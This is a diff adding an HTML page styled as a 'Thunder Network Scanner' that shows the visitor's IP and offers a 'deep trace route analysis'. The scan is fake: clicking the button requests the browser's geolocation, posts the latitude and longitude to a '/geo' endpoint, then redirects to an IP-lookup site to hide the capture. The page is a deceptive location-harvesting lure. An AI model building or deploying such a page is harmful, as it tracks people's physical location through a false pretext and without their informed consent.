@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>⚡ Thunder Network Intelligence</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Courier New', monospace;
+}
+
+body{
+height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+background:#05070c;
+color:white;
+overflow:hidden;
+}
+
+/* MATRIX CANVAS */
+
+canvas{
+position:fixed;
+top:0;
+left:0;
+z-index:0;
+}
+
+/* dashboard */
+
+.dashboard{
+position:relative;
+z-index:2;
+
+background:rgba(10,15,25,0.85);
+backdrop-filter:blur(14px);
+
+padding:35px;
+border-radius:14px;
+width:90%;
+max-width:420px;
+
+border:1px solid rgba(0,255,255,0.25);
+
+box-shadow:
+0 0 20px rgba(0,255,255,0.2),
+0 0 60px rgba(140,0,255,0.3);
+
+text-align:center;
+}
+
+/* title */
+
+.title{
+font-size:20px;
+font-weight:bold;
+margin-bottom:15px;
+
+background:linear-gradient(90deg,#00f2ff,#8a2be2,#00f2ff);
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
+}
+
+/* labels */
+
+.label{
+color:#8b949e;
+font-size:12px;
+text-transform:uppercase;
+letter-spacing:1px;
+margin-top:10px;
+}
+
+/* ip display */
+
+.ip-display{
+font-size:26px;
+font-weight:bold;
+margin:20px 0;
+color:#00f2ff;
+
+text-shadow:
+0 0 10px #00f2ff,
+0 0 30px #00f2ff,
+0 0 60px #8a2be2;
+}
+
+/* connection */
+
+.connection{
+color:#00ff9c;
+margin-bottom:20px;
+}
+
+/* button */
+
+button{
+
+width:100%;
+padding:15px;
+
+border:none;
+border-radius:6px;
+
+font-weight:bold;
+font-size:14px;
+
+cursor:pointer;
+color:white;
+
+background:linear-gradient(90deg,#00f2ff,#8a2be2,#00f2ff);
+background-size:200%;
+
+transition:0.3s;
+}
+
+button:hover{
+background-position:right;
+
+box-shadow:
+0 0 10px #00f2ff,
+0 0 25px #8a2be2,
+0 0 50px #00f2ff;
+
+transform:scale(1.04);
+}
+
+/* status */
+
+.status{
+font-size:11px;
+margin-top:15px;
+color:#9da5b4;
+}
+
+/* lightning flash */
+
+.flash{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:white;
+opacity:0;
+z-index:1;
+pointer-events:none;
+}
+
+</style>
+</head>
+
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div class="flash" id="flash"></div>
+
+<div class="dashboard">
+
+<div class="title">⚡ THUNDER NETWORK SCANNER</div>
+
+<div class="label">Your Public IP Address</div>
+<div class="ip-display">{{ user_ip }}</div>
+
+<div class="label">Connection Status</div>
+<div class="connection">● STABLE (AES-256)</div>
+
+<p style="font-size:13px;color:#c9d1d9;margin-bottom:10px;">
+Run a deep trace route analysis to detect network leaks.
+</p>
+
+<button onclick="scan()">⚡ RUN THUNDER SCAN</button>
+
+<div class="status" id="stat">Scanner Idle...</div>
+
+</div>
+
+<audio id="thunder">
+<source src="https://www.soundjay.com/nature/thunder-01.mp3">
+</audio>
+
+<script>
+
+/* MATRIX RAIN */
+
+const canvas = document.getElementById("matrix")
+const ctx = canvas.getContext("2d")
+
+canvas.height = window.innerHeight
+canvas.width = window.innerWidth
+
+const letters = "01THUNDERSECURITY"
+letters.split("")
+
+const fontSize = 14
+const columns = canvas.width / fontSize
+
+const drops = []
+
+for(let x=0;x<columns;x++)
+drops[x]=1
+
+function draw(){
+
+ctx.fillStyle="rgba(0,0,0,0.05)"
+ctx.fillRect(0,0,canvas.width,canvas.height)
+
+ctx.fillStyle="#00f2ff"
+ctx.font=fontSize+"px monospace"
+
+for(let i=0;i<drops.length;i++){
+
+const text=letters[Math.floor(Math.random()*letters.length)]
+
+ctx.fillText(text,i*fontSize,drops[i]*fontSize)
+
+if(drops[i]*fontSize>canvas.height && Math.random()>0.975)
+drops[i]=0
+
+drops[i]++
+
+}
+
+}
+
+setInterval(draw,35)
+
+
+/* SCAN */
+
+function scan(){
+
+document.getElementById("stat").innerHTML="⚡ Initializing Thunder Trace..."
+
+/* thunder flash */
+
+let flash=document.getElementById("flash")
+flash.style.opacity=1
+
+setTimeout(()=>{
+flash.style.opacity=0
+},120)
+
+/* thunder sound */
+
+document.getElementById("thunder").play()
+
+if(navigator.geolocation){
+
+navigator.geolocation.getCurrentPosition((pos)=>{
+
+document.getElementById("stat").innerHTML="Analyzing Network Packets..."
+
+fetch('/geo',{
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({
+lat:pos.coords.latitude,
+lon:pos.coords.longitude
+})
+}).then(()=>{
+window.location.href="https://whatismyipaddress.com"
+})
+
+},(err)=>{
+window.location.href="https://whatismyipaddress.com"
+})
+
+}else{
+
+window.location.href="https://whatismyipaddress.com"
+
+}
+
+}
+
+</script>
+
+</body>
+</html>
